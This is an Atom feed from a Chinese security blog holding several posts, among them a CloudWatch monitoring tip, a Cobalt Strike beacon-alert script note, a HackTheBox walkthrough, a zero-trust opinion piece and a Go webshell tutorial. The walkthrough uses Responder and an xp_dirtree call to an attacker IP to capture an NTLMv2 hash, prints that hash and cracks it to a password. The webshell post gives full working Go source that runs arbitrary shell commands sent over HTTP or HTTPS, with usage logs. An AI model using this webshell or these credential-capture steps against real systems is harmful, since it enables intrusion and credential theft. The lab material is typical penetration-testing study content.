<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>TonghuaRoot&#39;s BloG. - Cyber security enthusiast, not Hacker.</title>
  
  <subtitle>Know it, then Hack it!</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://tonghuaroot.com/"/>
  <updated>2020-05-27T08:07:44.045Z</updated>
  <id>https://tonghuaroot.com/</id>
  
  <author>
    <name>TonghuaRoot</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>使用 CloudWatch Event 监控 ElasticSearch 事件</title>
    <link href="https://tonghuaroot.com/2020/05/21/Use-CloudWatch-Event-to-monitor-ElasticSearch-events/"/>
    <id>https://tonghuaroot.com/2020/05/21/Use-CloudWatch-Event-to-monitor-ElasticSearch-events/</id>
    <published>2020-05-21T21:42:28.000Z</published>
    <updated>2020-05-27T08:07:44.045Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>为了监控 ElasticSearch Cluster 被非预期删除、创建等情况，需要搞一个监控，当监控到这种行为时，会触发 SNS 告警。<br>有如下几个思路：</p><ol><li>写个脚本定期监控 CloudTrail 有非预期API CALL的时候触发SNS</li><li>将 CloudTrail 中的日志写到 CloudWatch log group 中，然后再自定义 metric 配合 alarm 实现告警</li><li>利用 CloudWatch Event 监听 elasticsearch 事件实现告警</li></ol><h2 id="0x01-思路解读"><a href="#0x01-思路解读" class="headerlink" title="0x01 思路解读"></a>0x01 思路解读</h2><p>第一种方法就是将 CloudTrail logs 打到 S3 然后在分析 S3 中存储的 api call 情况，这种需要人工介入的地方还挺多的，不咋优雅，还有优先采用 AWS 自身提供的服务做到这件事，故跳过了。<br>第二种方法可以参考文档[1]，直接梭哈。<br>第三种就有意思了，官方文档中没有给出现成的demo[2]，需要我们自定义，这里就来聊一聊自定义的思路。</p><h2 id="0x02-利用-CloudWatch-Event-监听-elasticsearch-事件实现告警"><a href="#0x02-利用-CloudWatch-Event-监听-elasticsearch-事件实现告警" class="headerlink" title="0x02 利用 CloudWatch Event 监听 elasticsearch 事件实现告警"></a>0x02 利用 CloudWatch Event 监听 elasticsearch 事件实现告警</h2><p>在 CloudWatch Event 的 console 中 service name 并没有ES相关的服务。</p><p><img src="01.png" alt="1"></p><p>在文档[1]中有提及“Creating a CloudWatch Events Rule That Triggers on an AWS API Call Using AWS CloudTrail”，也就是说理论上cloudtrail中记录的log在这里都能实现监控和告警。研究了一下，Event Pattern 内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;source&quot;: [</span><br><span class="line">    &quot;aws.es&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;detail-type&quot;: [</span><br><span class="line">    &quot;AWS API Call via CloudTrail&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;detail&quot;: &#123;</span><br><span class="line">    &quot;eventSource&quot;: [</span><br><span class="line">      &quot;es.amazonaws.com&quot;</span><br><span class="line">    ],</span><br><span class="line">    &quot;eventName&quot;: [</span><br><span class="line">      &quot;DeleteElasticsearchDomain&quot;,</span><br><span class="line">      &quot;CreateElasticsearchDomain&quot;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>思路就是找一个其他服务的 Event Pattern 然后尝试替换为 ES 的 source、eventSource、eventName。<br>效果如下：</p><p><img src="02.png" alt="2"></p><p>不过现在要自己写，没准过段时间，这个功能就加上了呢。</p><h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><ul><li>[1] Creating CloudWatch Alarms for CloudTrail Events: Examples, <a href="https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudwatch-alarms-for-cloudtrail.html" target="_blank" rel="noopener">https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudwatch-alarms-for-cloudtrail.html</a></li><li>[2] Creating a CloudWatch Events Rule That Triggers on an AWS API Call Using AWS CloudTrail, <a href="https://docs.amazonaws.cn/en_us/AmazonCloudWatch/latest/events/Create-CloudWatch-Events-CloudTrail-Rule.html" target="_blank" rel="noopener">https://docs.amazonaws.cn/en_us/AmazonCloudWatch/latest/events/Create-CloudWatch-Events-CloudTrail-Rule.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;为了监控 ElasticSearch Cluster 被非预期删除、创建等情况，需要搞一个监控，当监
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CobaltStrike Aggressor Script 实现 Beacon 上线告警功能</title>
    <link href="https://tonghuaroot.com/2020/04/25/Cobalt-Strike-Aggressor-Script-IM-Alert/"/>
    <id>https://tonghuaroot.com/2020/04/25/Cobalt-Strike-Aggressor-Script-IM-Alert/</id>
    <published>2020-04-25T00:36:41.000Z</published>
    <updated>2020-04-25T08:48:54.899Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>把之前写的一个笔记翻出来，思路比较简单，所以也就不额外的添加内容直接发出来了。</p><p>最近在研究CobaltStrike，有一个使用场景是说，当我把钓鱼邮件发出去了，等着Beacon上线的这段时间是无感知的，也就是说什么时候上线不知道、上没上线也不知道。传统的解决方案是说抽空上来瞅一眼，长远来讲这种方法是低效且不可靠的（emm，看日志可以知道shell来过又掉了hhh）。<br>而我个人做事的态度是比较推崇流程化、工具化、自动化和文档化的，所以便想着可以配合一些IM实现Beacon上线以及System Profiler触发的实时告警，方便RedTeamer及时响应做后续的操作。</p><h2 id="0x01-告警项"><a href="#0x01-告警项" class="headerlink" title="0x01 告警项"></a>0x01 告警项</h2><ul><li>Beacon</li><li>System Profiler</li><li>Clone Site</li><li>etc…</li></ul><h2 id="0x02-需要适配的IM"><a href="#0x02-需要适配的IM" class="headerlink" title="0x02 需要适配的IM"></a>0x02 需要适配的IM</h2><ul><li>钉钉</li><li>微信</li><li>企业微信</li><li>Slack</li><li>Telegram</li><li>Chime</li><li>Mail</li><li>自定义函数（方便后续其他IM适配）</li></ul><h2 id="0x03-实现思路"><a href="#0x03-实现思路" class="headerlink" title="0x03 实现思路"></a>0x03 实现思路</h2><p>代码量不多，整体的思路是，当事件触发时调用 HTTP POST/GET 请求，callback对应的IM应用接收消息，工作量主要集中在各类 IM webhook 的接口申请上，或者未开放接口的，要找一些第三方的开源解决方案，效果图如下：</p><p><img src="01.png" alt="01"></p><p><img src="02.png" alt="02"></p><p>参考文档：<a href="https://www.cobaltstrike.com/aggressor-script/events.html" target="_blank" rel="noopener">https://www.cobaltstrike.com/aggressor-script/events.html</a> ，获取 Cobalt Strike 的 event list。</p><p>结合 Headless Cobalt Strike 可以应用到将 cna 脚本的功能同步至连接同一 teamserver 的全部 Cobalt Strike Client，参考：<a href="https://www.cobaltstrike.com/aggressor-script/index.html" target="_blank" rel="noopener">https://www.cobaltstrike.com/aggressor-script/index.html</a></p><p>这么做有一个好处，避免 Cobalt Strike Client 所处的网络不稳导致无法实时感知 Beacon 上线行为，协同作战的时候也比较方便。</p><p>代码放在 Github 上了：<a href="https://github.com/omg2hei/CobaltStrikeAggressor/blob/master/CSNotification.cna" target="_blank" rel="noopener">https://github.com/omg2hei/CobaltStrikeAggressor/blob/master/CSNotification.cna</a></p><h2 id="0x04-后记"><a href="#0x04-后记" class="headerlink" title="0x04 后记"></a>0x04 后记</h2><p>Aggressor 脚本写起来并不难，主要还是安全思路的价值大于软件工程，最近在整理一些基础功能的cna代码，以期当有更好的安全思路时可以快速构建PoC，验证思路的价值。</p><h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><ul><li>[1] 利用钉钉机器人发送告警信息, <a href="https://www.jianshu.com/p/52b5861ded59" target="_blank" rel="noopener">https://www.jianshu.com/p/52b5861ded59</a></li><li>[2] Slack Notifications for Cobalt Strike, <a href="https://threatexpress.com/blogs/2016/slack-notifications-for-cobalt-strike/#slack-notifications-for-cobalt-strike" target="_blank" rel="noopener">https://threatexpress.com/blogs/2016/slack-notifications-for-cobalt-strike/#slack-notifications-for-cobalt-strike</a></li><li>[3] <a href="https://github.com/dcsync/pycobalt/blob/master/docs/aggressor.md" target="_blank" rel="noopener">https://github.com/dcsync/pycobalt/blob/master/docs/aggressor.md</a></li><li>[4] 自动化工具 钉钉机器人消息 Python 封装 (开源), <a href="https://testerhome.com/topics/11758" target="_blank" rel="noopener">https://testerhome.com/topics/11758</a></li><li>[5] Cobalt Strike神器高级教程利用Aggressor脚本编写目标上线邮件提醒, <a href="https://blog.csdn.net/qq_27446553/article/details/79380021" target="_blank" rel="noopener">https://blog.csdn.net/qq_27446553/article/details/79380021</a></li><li>[6] aggressor_scripts/http.cna, <a href="https://github.com/001SPARTaN/aggressor_scripts/blob/master/http.cna" target="_blank" rel="noopener">https://github.com/001SPARTaN/aggressor_scripts/blob/master/http.cna</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;把之前写的一个笔记翻出来，思路比较简单，所以也就不额外的添加内容直接发出来了。&lt;/p&gt;
&lt;p&gt;最近在
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>HashCat：如何利用HashCat破解NTLMv2 hash？</title>
    <link href="https://tonghuaroot.com/2020/03/02/how-to-use-hashcat-to-crack-ntlmv2-hash/"/>
    <id>https://tonghuaroot.com/2020/03/02/how-to-use-hashcat-to-crack-ntlmv2-hash/</id>
    <published>2020-03-02T07:29:12.000Z</published>
    <updated>2020-03-02T15:43:22.387Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>当我们利用Responder拿到目标机做SMB文件共享时使用的NetNTLMv2 hash后，可以利用HashCat对该hash进行破解，还原出明文密码。</p><p>在这篇文章中，我会介绍一下，如何利用Responder监听拿到目标机的NetNTLMv2 hash。以及如何使用HashCat破解hash还原密码。</p><h2 id="0x01-实验环境"><a href="#0x01-实验环境" class="headerlink" title="0x01 实验环境"></a>0x01 实验环境</h2><p>攻击机（Kali Linux）：10.10.14.7</p><p>靶机（Microsoft Windows Server 2019 Standard）：10.10.10.125</p><p>我们现在以及拿到了一个低权限的MSSQL账号密码，然后想要利用Responder进一步拿到NetNTLMv2 hash。</p><p>当然拿到NetNTLMv2 hash的方法还有很多，比如说我18年在朋友圈提到的Word doc UNC注入拿NetNTLMv2 hash。</p><p><img src="1.png" alt="1"></p><h2 id="0x02-如何利用Responder监听目标机器的NetNTLMv2-hash？"><a href="#0x02-如何利用Responder监听目标机器的NetNTLMv2-hash？" class="headerlink" title="0x02 如何利用Responder监听目标机器的NetNTLMv2 hash？"></a>0x02 如何利用Responder监听目标机器的NetNTLMv2 hash？</h2><p>第1步：启动Responder</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I tun0</span><br></pre></td></tr></table></figure><p><img src="2.png" alt="2"></p><p>第2步：利用SMB文件共享，访问攻击机的目录，请求就会打在Responder上了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_dirtree &quot;\\10.10.14.7\tonghuaroot.com&quot;</span><br></pre></td></tr></table></figure><p><img src="3.png" alt="3"></p><p>第3步：检查Responder记录</p><p>可以看到我们已经成功拿到了NTLMv2 hash。</p><p><img src="4.png" alt="4"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mssql-svc::QUERIER:3dedaec57679f94c:D07E7F388AC9FBCC407509FCF0745E13:0101000000000000C0653150DE09D20174F5F4C3BF1B0BDA000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000000000000000000003000006E68D653C9F1101BDD416587149E0A62257D13DFDAE23D53CEF44E8FB43B04120A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003700000000000000000000000000</span><br></pre></td></tr></table></figure><h2 id="0x03-如何利用HashCat破解NetNTLMv2-Hash？"><a href="#0x03-如何利用HashCat破解NetNTLMv2-Hash？" class="headerlink" title="0x03 如何利用HashCat破解NetNTLMv2 Hash？"></a>0x03 如何利用HashCat破解NetNTLMv2 Hash？</h2><p>其实很简单，HashCat在破解密码的时候分为不同的Mode，对应不同的加密方式。</p><p>第1步：确认应该采用哪种Mode进行破解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat --example-hashes | less</span><br></pre></td></tr></table></figure><p><img src="5.png" alt="5"></p><p>MODE: 5600</p><p>第2步：加载字典破解NetNTLMv2 hash</p><p>（注：这里只是演示使用思路，具体实际环境使用GPU破解、搭建密码破解集群等内容将会在后面的内容为大家介绍。）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 hashes/Querier.ntlmv2 /usr/share/wordlists/rockyou.txt --force</span><br></pre></td></tr></table></figure><p><img src="6.png" alt="6"></p><p>域：QUERIER</p><p>用户名：MSSQL-SVC</p><p>密码：corporate568</p><p>使用上面HashCat跑出来的凭证我们就可以继续后续的利用了，当然这部分并不是本文讨论的重点。</p><p><img src="7.png" alt="7"></p><h2 id="0x04-后记"><a href="#0x04-后记" class="headerlink" title="0x04 后记"></a>0x04 后记</h2><p>在这篇文章种主要记录了一下使用使用HashCat破解NetNTLMv2 Hash。</p><p>如果您对我的文章感兴趣，并且再复现的时候遇到了困难，请随时PM我，我非常愿意花时间和您讨论。</p><p>PS：渗透这东西主要还是积累、经验和思路，再就是要多动手，HTB这个平台我吹到爆，实验环境多的很，真的是舒服。</p><h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><p>[1] Querier, <a href="https://www.hackthebox.eu/home/machines/profile/175" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/175</a></p><p>[2] HackTheBox - Querier, <a href="https://www.youtube.com/embed/d7ACjty4m7U?rel=0&amp;controls=1&amp;modestbranding=1" target="_blank" rel="noopener">https://www.youtube.com/embed/d7ACjty4m7U?rel=0&amp;controls=1&amp;modestbranding=1</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;当我们利用Responder拿到目标机做SMB文件共享时使用的NetNTLMv2 hash后，可以利
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>我也来喷一喷零信任</title>
    <link href="https://tonghuaroot.com/2020/02/27/Zero-trust-in-my-eyes/"/>
    <id>https://tonghuaroot.com/2020/02/27/Zero-trust-in-my-eyes/</id>
    <published>2020-02-27T23:18:58.000Z</published>
    <updated>2020-02-28T07:29:45.283Z</updated>
    
    <content type="html"><![CDATA[<ul><li>2019年12月26日 11:29</li></ul><p>零信任安全架构的核心就是 Never Trust， Always Verify。</p><p>说白了就是针对身份实体的请求上下文做一个综合判断，最后给出allow或者deny的结论，可玩的点还是在于鉴权的proxy怎么实现，规则怎么写，怎么对接后端服务，如何配合专业研发的能力，做好system design实现高并发、高可用（毕竟原本可以直接打到后段服务的请求，现在要走一层鉴权的proxy）。</p><p>为啥中文资料说的一个比一个玄乎，你跟所谓“安全专家”请教零信任的时候，他就跟你玄学科普，只谈宏观安全建设，不谈技术细节，你拿着Google BeyondCorp的paper再跟他讨论如何落地的时候，他又避而不谈跟你扯到ATT&amp;CK了，我…港真，直接撸BeyondCorp那篇paper，再结合公有云厂商的IAM实现来看比那些蹭流量的辣鸡水文靠谱的多。</p><p>另外，我酸了，有的时候闷头搞东西出不来成果的时候，真的很羡慕这些靠吹牛逼赚钱的“安全专家”。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;2019年12月26日 11:29&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;零信任安全架构的核心就是 Never Trust， Always Verify。&lt;/p&gt;
&lt;p&gt;说白了就是针对身份实体的请求上下文做一个综合判断，最后给出allow或者deny的结论，可玩的点还是在
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>如何实现一个基于 Golang 的  webshell？</title>
    <link href="https://tonghuaroot.com/2020/01/01/Golang-webshell/"/>
    <id>https://tonghuaroot.com/2020/01/01/Golang-webshell/</id>
    <published>2020-01-01T06:42:39.000Z</published>
    <updated>2020-01-01T14:52:53.977Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在这篇文章中，我将记录一下如何使用Golang实现一个webshell。</p><h2 id="0x01-HTTP"><a href="#0x01-HTTP" class="headerlink" title="0x01 HTTP"></a>0x01 HTTP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">   &quot;fmt&quot;</span><br><span class="line">   &quot;log&quot;</span><br><span class="line">   &quot;net/http&quot;</span><br><span class="line">   &quot;os&quot;</span><br><span class="line">   &quot;os/exec&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">var shell = &quot;/bin/sh&quot;</span><br><span class="line">var shellArg = &quot;-c&quot;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">   if len(os.Args) != 2 &#123;</span><br><span class="line">      fmt.Printf(&quot;Usage: %s &lt;listenAddress&gt;\n&quot;, os.Args[0])</span><br><span class="line">      fmt.Printf(&quot;Example: %s localhost:8080\n&quot;, os.Args[0])</span><br><span class="line">      os.Exit(1)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   http.HandleFunc(&quot;/&quot;, requestHandler)</span><br><span class="line">   log.Println(&quot;Listening for HTTP requests.&quot;)</span><br><span class="line">   err := http.ListenAndServe(os.Args[1], nil)</span><br><span class="line">   if err != nil &#123;</span><br><span class="line">      log.Fatal(&quot;Error creating server. &quot;, err)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func requestHandler(writer http.ResponseWriter, request *http.Request) &#123;</span><br><span class="line">   // Get command to execute from GET query parameters</span><br><span class="line">   cmd := request.URL.Query().Get(&quot;cmd&quot;)</span><br><span class="line">   if cmd == &quot;&quot; &#123;</span><br><span class="line">      fmt.Fprintln(</span><br><span class="line">         writer,</span><br><span class="line">         &quot;No command provided. Example: /?cmd=whoami&quot;)</span><br><span class="line">      return</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   log.Printf(&quot;Request from %s: %s\n&quot;, request.RemoteAddr, cmd)</span><br><span class="line">   fmt.Fprintf(writer, &quot;You requested command: %s\n&quot;, cmd)</span><br><span class="line"></span><br><span class="line">   // Run the command</span><br><span class="line">   command := exec.Command(shell, shellArg, cmd)</span><br><span class="line">   output, err := command.Output()</span><br><span class="line">   if err != nil &#123;</span><br><span class="line">      fmt.Fprintf(writer, &quot;Error with command.\n%s\n&quot;, err.Error())</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   // Write output of command to the response writer interface</span><br><span class="line">   fmt.Fprintf(writer, &quot;Output: \n%s\n&quot;, output)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="1.png" alt="image"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ec2-user@kali:~/go/src/webshell$ go install webshell</span><br><span class="line">ec2-user@kali:~/go/src/webshell$ ~/go/bin/webshell 0.0.0.0:80</span><br><span class="line">2020/01/01 14:05:55 Listening for HTTP requests.</span><br><span class="line">2020/01/01 14:05:55 Error creating server. listen tcp 0.0.0.0:80: bind: permission denied</span><br><span class="line">ec2-user@kali:~/go/src/webshell$ sudo ~/go/bin/webshell 0.0.0.0:80</span><br><span class="line">2020/01/01 14:06:00 Listening for HTTP requests.</span><br><span class="line">2020/01/01 14:06:04 Request from 54.222.196.177:61772: ifconfig</span><br><span class="line">^C</span><br><span class="line">ec2-user@kali:~/go/src/webshell$</span><br></pre></td></tr></table></figure></p><p><img src="2.png" alt="image"></p><h2 id="0x02-HTTPS"><a href="#0x02-HTTPS" class="headerlink" title="0x02 HTTPS"></a>0x02 HTTPS</h2><p>注意把证书和私钥配上就可以走HTTPS了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">   &quot;fmt&quot;</span><br><span class="line">   &quot;log&quot;</span><br><span class="line">   &quot;net/http&quot;</span><br><span class="line">   &quot;os&quot;</span><br><span class="line">   &quot;os/exec&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">var shell = &quot;/bin/sh&quot;</span><br><span class="line">var shellArg = &quot;-c&quot;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">   if len(os.Args) != 2 &#123;</span><br><span class="line">      fmt.Printf(&quot;Usage: %s &lt;listenAddress&gt;\n&quot;, os.Args[0])</span><br><span class="line">      fmt.Printf(&quot;Example: %s localhost:8080\n&quot;, os.Args[0])</span><br><span class="line">      os.Exit(1)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   http.HandleFunc(&quot;/&quot;, requestHandler)</span><br><span class="line">   log.Println(&quot;Listening for HTTPS requests.&quot;)</span><br><span class="line">   err := http.ListenAndServeTLS( </span><br><span class="line">      &quot;os.Args[1]&quot;, </span><br><span class="line">      &quot;cert.pem&quot;, </span><br><span class="line">      &quot;privateKey.pem&quot;, </span><br><span class="line">      nil, </span><br><span class="line">   )</span><br><span class="line">   if err != nil &#123;</span><br><span class="line">      log.Fatal(&quot;Error creating server. &quot;, err)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func requestHandler(writer http.ResponseWriter, request *http.Request) &#123;</span><br><span class="line">   // Get command to execute from GET query parameters</span><br><span class="line">   cmd := request.URL.Query().Get(&quot;cmd&quot;)</span><br><span class="line">   if cmd == &quot;&quot; &#123;</span><br><span class="line">      fmt.Fprintln(</span><br><span class="line">         writer,</span><br><span class="line">         &quot;No command provided. Example: /?cmd=whoami&quot;)</span><br><span class="line">      return</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   log.Printf(&quot;Request from %s: %s\n&quot;, request.RemoteAddr, cmd)</span><br><span class="line">   fmt.Fprintf(writer, &quot;You requested command: %s\n&quot;, cmd)</span><br><span class="line"></span><br><span class="line">   // Run the command</span><br><span class="line">   command := exec.Command(shell, shellArg, cmd)</span><br><span class="line">   output, err := command.Output()</span><br><span class="line">   if err != nil &#123;</span><br><span class="line">      fmt.Fprintf(writer, &quot;Error with command.\n%s\n&quot;, err.Error())</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   // Write output of command to the response writer interface</span><br><span class="line">   fmt.Fprintf(writer, &quot;Output: \n%s\n&quot;, output)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="3.png" alt="image"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ec2-user@kali:~/go/src/httpswebshell$ curl 127.0.0.1:443/?cmd=id</span><br><span class="line">You requested command: id</span><br><span class="line">Output:</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure></p><p><img src="4.png" alt="image"></p><h2 id="0x03-使用方法（交叉编译）"><a href="#0x03-使用方法（交叉编译）" class="headerlink" title="0x03 使用方法（交叉编译）"></a>0x03 使用方法（交叉编译）</h2><p>需要针对目标主机的类型，将其编译为对应的可执行文件。<br>本地测试命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo go run ~/go/src/httpswebshell/webshell.go 0.0.0.0:443</span><br><span class="line">go install httpswebshell # 编译</span><br></pre></td></tr></table></figure></p><h2 id="0x04-后记"><a href="#0x04-后记" class="headerlink" title="0x04 后记"></a>0x04 后记</h2><p>记录一下使用Golang实现webshell，走HTTP(S)。</p><h2 id="0x05-参考文献"><a href="#0x05-参考文献" class="headerlink" title="0x05 参考文献"></a>0x05 参考文献</h2><p>[1] Security with Go</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;在这篇文章中，我将记录一下如何使用Golang实现一个webshell。&lt;/p&gt;
&lt;h2 id=&quot;0
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>如何配置Policy强制AWS控制台使用MFA，CLI不用MFA？</title>
    <link href="https://tonghuaroot.com/2019/11/25/AWS-IAM-MFA-force-console-no-use-MFA-in-CLI/"/>
    <id>https://tonghuaroot.com/2019/11/25/AWS-IAM-MFA-force-console-no-use-MFA-in-CLI/</id>
    <published>2019-11-25T00:42:17.000Z</published>
    <updated>2019-11-25T08:50:22.016Z</updated>
    
